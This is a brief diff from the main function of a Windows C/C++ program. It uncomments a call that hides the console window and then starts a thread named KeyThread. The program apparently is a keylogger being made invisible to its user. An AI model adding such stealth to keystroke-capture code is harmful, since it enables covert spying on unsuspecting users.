@@ -40,7 +40,7 @@ static void CreateTempPath()
 int main(int argc, char** argv)
 {
 	srand(time(0));
-	//ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), SW_HIDE);
 
 	CreateTempPath();
 	CreateThread(0, 0, KeyThread, 0, 0, 0);
